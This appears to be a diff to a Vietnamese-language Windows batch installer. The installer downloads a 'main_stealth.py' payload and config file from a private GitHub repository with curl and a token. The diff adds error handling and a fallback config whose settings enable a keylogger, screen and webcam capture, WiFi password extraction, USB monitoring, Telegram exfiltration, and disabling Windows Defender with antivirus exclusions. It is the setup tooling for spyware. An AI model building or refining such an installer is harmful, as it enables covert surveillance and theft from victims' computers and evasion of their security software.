@@ -108,6 +108,30 @@ if not exist "main_stealth.py.tmp" (
     pause
     exit /b 1
 )
+REM Kiểm tra nội dung file (không được chứa "404" hoặc "Not Found")
+findstr /C:"404" /C:"Not Found" "main_stealth.py.tmp" >nul 2>&1
+if not errorlevel 1 (
+    echo [ERROR] File tai ve bi loi 404 - khong tim thay file tren GitHub!
+    echo Kiem tra lai:
+    echo   - GITHUB_USER: %GITHUB_USER%
+    echo   - GITHUB_REPO: %GITHUB_REPO%
+    echo   - GITHUB_TOKEN: co hop le khong?
+    echo   - File main_stealth.py co ton tai tren GitHub khong?
+    type "main_stealth.py.tmp"
+    del /f /q "main_stealth.py.tmp" >nul 2>&1
+    pause
+    exit /b 1
+)
+REM Kiểm tra file không rỗng và có nội dung hợp lệ (ít nhất 100 ký tự)
+for %%f in ("main_stealth.py.tmp") do (
+    if %%~zf LSS 100 (
+        echo [ERROR] File tai ve qua nho hoac khong hop le!
+        type "main_stealth.py.tmp"
+        del /f /q "main_stealth.py.tmp" >nul 2>&1
+        pause
+        exit /b 1
+    )
+)
 REM Đổi tên file tạm thành file chính
 move /y "main_stealth.py.tmp" "main_stealth.py" >nul 2>&1
 if not exist "main_stealth.py" (
@@ -122,16 +146,82 @@ if exist "config.py" (
     attrib -h -s "config.py" >nul 2>&1
     del /f /q "config.py" >nul 2>&1
 )
-curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "config.py.tmp" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/config.py" 2>nul
+curl -L -H "Authorization: token %GITHUB_TOKEN%" -o "config.py.tmp" "https://raw.githubusercontent.com/%GITHUB_USER%/%GITHUB_REPO%/main/config.py" 2>"%INSTALL_DIR%\curl_error.log"
 if exist "config.py.tmp" (
+    REM Kiểm tra lỗi 404
+    for %%f in ("config.py.tmp") do (
+        if %%~zf LSS 50 (
+            echo [WARNING] File config.py tai ve co the bi loi, bo qua...
+            del /f /q "config.py.tmp" >nul 2>&1
+            goto :skip_config_check
+        )
+    )
+    findstr /C:"404" /C:"Not Found" /C:"Bad credentials" "config.py.tmp" >nul 2>&1
+    if not errorlevel 1 (
+        echo [WARNING] File config.py bi loi 404, bo qua (file nay khong can thiet)...
+        del /f /q "config.py.tmp" >nul 2>&1
+        goto :skip_config_check
+    )
     move /y "config.py.tmp" "config.py" >nul 2>&1
 )
+:skip_config_check
 if not exist "config.py" (
-    echo [ERROR] Khong the tai config.py!
-    pause
-    exit /b 1
+    echo [WARNING] Khong the tai config.py tu GitHub!
+    echo File config.py se duoc tao tu template hoac ban can tao thu cong.
+    echo.
+    REM Tạo config.py mẫu nếu không tải được
+    if not exist "config.py" (
+        echo Tao file config.py mau...
+        (
+            echo # File cau hinh
+            echo TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN_HERE"
+            echo TELEGRAM_CHAT_ID = "YOUR_TELEGRAM_CHAT_ID_HERE"
+            echo.
+            echo # Cau hinh quay man hinh
+            echo RECORD_DURATION = 20
+            echo RECORD_FPS = 5
+            echo VIDEO_QUALITY = "low"
+            echo MAX_VIDEO_WIDTH = 1280
+            echo MAX_VIDEO_HEIGHT = 720
+            echo.
+            echo # Cau hinh thoi gian gui du lieu dinh ky
+            echo VIDEO_SEND_INTERVAL = 20
+            echo.
+            echo # Cau hinh keylogger
+            echo KEYLOG_ENABLED = True
+            echo KEYLOG_FILE = "keylog.txt"
+            echo.
+            echo # Cau hinh tu dong xoa
+            echo AUTO_DELETE_VIDEO = True
+            echo.
+            echo # Thu muc luu tru tam
+            echo TEMP_DIR = "temp"
+            echo.
+            echo # Cau hinh toi uu hieu nang
+            echo LOW_PRIORITY_MODE = True
+            echo MAX_CPU_USAGE = 30
+            echo OPTIMIZE_FOR_WEAK_PC = True
+            echo.
+            echo # Cau hinh chong phat hien
+            echo DISABLE_DEFENDER = True
+            echo ADD_TO_EXCLUSIONS = True
+            echo.
+            echo # Cau hinh chuc nang moi
+            echo WIFI_EXTRACTOR_ENABLED = True
+            echo WIFI_EXTRACT_INTERVAL = 3600
+            echo.
+            echo WEBCAM_CAPTURE_ENABLED = True
+            echo WEBCAM_CAPTURE_INTERVAL = 1800
+            echo.
+            echo USB_MONITOR_ENABLED = True
+            echo USB_CHECK_INTERVAL = 60
+        ) > "config.py"
+        echo [OK] Da tao file config.py mau
+        echo [WARNING] Vui long sua file config.py va dien TELEGRAM_BOT_TOKEN va TELEGRAM_CHAT_ID!
+    )
+) else (
+    echo [OK] Da tai config.py
 )
-echo [OK] Da tai config.py
 
 echo Dang tai requirements.txt...
 if exist "requirements.txt" (
